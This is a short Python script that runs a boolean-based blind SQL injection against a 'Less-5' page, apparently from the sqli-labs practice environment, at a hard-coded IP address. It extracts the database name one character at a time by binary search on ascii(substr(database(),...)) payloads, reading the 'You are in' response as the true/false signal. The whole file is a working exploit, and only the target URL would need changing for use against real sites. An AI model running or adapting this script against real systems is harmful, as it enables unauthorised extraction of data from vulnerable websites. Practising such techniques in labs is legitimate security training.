import requests

database = ''
for i in range(1, 20):
    low = 32
    high = 127
    mid = (low + high) // 2
    while high > low:
        payload = "1' and ascii(substr(database(),{},1))>{} --+".format(i, mid)
        url = 'http://129.211.79.54:8801/Less-5/?id=' + payload
        r = requests.get(url)

        if 'You are in' in r.text:
            low = mid + 1
            mid = (low + high) // 2
        else:
            high = mid
        mid = (low + high) // 2
    database += chr(int(mid))
    print(database)
